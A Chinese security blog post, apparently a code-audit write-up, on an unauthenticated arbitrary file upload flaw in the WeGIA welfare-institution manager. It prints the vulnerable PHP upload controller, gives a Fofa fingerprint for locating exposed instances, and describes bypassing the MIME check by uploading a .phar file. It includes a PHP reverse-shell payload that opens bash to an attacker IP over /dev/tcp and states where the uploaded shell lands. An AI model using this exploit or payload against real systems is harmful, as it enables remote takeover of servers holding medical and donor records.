#  【代码审计】WeGIA 存在前台任意文件上传漏洞 (RCE)   
原创 Mstir  星悦安全   2025-01-18 11:08  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
WeGIA是一个福利机构管理器，并且具有一下几种功能，并且在3.2.8及之前版本都存在前台任意文件上传漏洞，且都可进行直接上传Phar等文件执行任意命令，反弹Shell等操作:  
- 人员，用于员工和与会者的注册;  
  
- 材料和资产，用于仓库控制和捐赠;  
  
- 备忘录，用于在各个部门之间交换机构信息，减少纸张流动;  
  
- 捐款，通过信用卡或银行单据捐款筹集资金;  
  
- 健康，用于管理受助人员和员工的医疗记录和药物控制;  
  
- 宠物，用于登记所服务的动物  
  
RT  
  
**Fofa指纹:"./assets/vendor/select2/select2.js"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5cVY95H7tSkdBibeP8gaCafQ6gtWqAjBfnwAUsFWFw43IyiaEYZOLaIUcluaj7AMkGPAV7fTYFOYKfQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5cVY95H7tSkdBibeP8gaCafQn0icziaZybBJ2RcjBxzuXGl7USOWtFEGLMYPmC2Q2ovMg810M8vDQ0zQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5cVY95H7tSkdBibeP8gaCafQn0icziaZybBJ2RcjBxzuXGl7USOWtFEGLMYPmC2Q2ovMg810M8vDQ0zQ/640?wx_fmt=png&from=appmsg "")  
## 0x01 漏洞分析&复现  
  
**漏洞点位于 /WeGIA/html/socio/sistema/controller/controla_xlsx.php 中，可以很清楚地看到存在文件上传操作，只需要上传的mini为application/vnd.ms-excel 即可上传**  
  
```
<?php
// Inicia a sessão
session_start();
require_once(dirname(__DIR__, 3) . '/permissao/permissao.php');

permissao($_SESSION['id_pessoa'], 4, 3);

// Inicializa a resposta padrão
$r = array(
    "resultado" => false,
    "mensagem" => "Ocorreu um erro ao processar o arquivo."
);

// Diretório seguro para armazenamento de arquivos
$diretorio = "../tabelas/";

// Cria o diretório, se não existir
if (!is_dir($diretorio)) {
    if (!mkdir($diretorio, 0755, true)) {
        $r['mensagem'] = "Erro ao criar diretório de upload.";
        echo json_encode($r);
        exit;
    }
}

if (!empty($_FILES['arquivo']['name'])) {
    // Tipos MIME permitidos para arquivos Excel (.xls e .xlsx)
    $tiposMimePermitidos = array(
        'application/vnd.ms-excel', // Para .xls
        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' // Para .xlsx
    );

    // Obtém o tipo MIME do arquivo
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $tipoMime = finfo_file($finfo, $_FILES['arquivo']['tmp_name']);
    finfo_close($finfo);

    // Verifica se o tipo MIME do arquivo é permitido
    if (!in_array($tipoMime, $tiposMimePermitidos)) {
        http_response_code(400);
        $r['mensagem'] = "Tipo de arquivo inválido. Apenas arquivos .xls e .xlsx são permitidos.";
        echo json_encode($r);
        exit;
    }

    // Obtém o nome e a extensão do arquivo
    $file_name_original = basename($_FILES['arquivo']['name']);
    $extensao = strtolower(pathinfo($file_name_original, PATHINFO_EXTENSION));

    // Sanitiza o nome do arquivo para evitar problemas com caracteres especiais
    $file_name_sanitized = preg_replace("/[^a-zA-Z0-9\._-]/", "_", pathinfo($file_name_original, PATHINFO_FILENAME));
    $file_name = uniqid() . "_" . $file_name_sanitized . '.' . $extensao;

    // Verifica se o arquivo já existe (mesmo com nomes únicos, esta é uma garantia extra)
    $destino = $diretorio . $file_name;
    if (file_exists($destino)) {
        $r['mensagem'] = "Um arquivo com o mesmo nome já existe.";
        echo json_encode($r);
        exit;
    }

    // Move o arquivo para o diretório seguro
    if (move_uploaded_file($_FILES['arquivo']['tmp_name'], $destino)) {
        $r['resultado'] = true;
        $r['mensagem'] = "Upload realizado com sucesso.";
        $r['url'] = "./tabelas/" . urlencode($file_name); // Codifica a URL para evitar problemas
    } else {
        $r['mensagem'] = "Erro ao mover o arquivo para o diretório de destino.";
    }
}

// Retorna a resposta em formato JSON
echo json_encode($r);
?>
```  
  
  
从/WeGIA/html/socio/sistema/controller/controla_xlsx.php 捕获文件上传请求后，只需将上传的文件类型更改为 .phar，将有效负载插入内容中并发送请求即可。  
  
```
<?php
$ip = 'IP';
$port = 4444;
system("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
?>


```  
  
  
Payload:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5cVY95H7tSkdBibeP8gaCafQuLZUoia2JA1Q6KT6Q0ZicaegmBldVQKdU5ibFJymOEdSfuw9ibq2sGAzUg/640?wx_fmt=png&from=appmsg "")  
  
上传后，文件在 /WeGIA/html/socio/sistema/tabelas/shell.phar  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5cVY95H7tSkdBibeP8gaCafQtyIcZOO2w4oXCzdW0271XpKibCN8b7iaicPBCjYibeoZhgeunhGCxE1YBQ/640?wx_fmt=png&from=appmsg "")  
## 0x02 WeGIA源码下载  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
WeGIA源码  
**关注公众号发送 250118 获取!**  
  
  
  
****  
**开了个星悦安全公开交流2群，🈲发公众号，纯粹研究技术，还会拉一些大佬，希望大家多多交流.**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5cVY95H7tSkdBibeP8gaCafQlIAGvwMjWViahIHLVzvxa8IXjkL69q5Uic6ymkEMuDfAQRia8AZYL6A2Q/640?wx_fmt=jpeg&from=appmsg "")  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
  
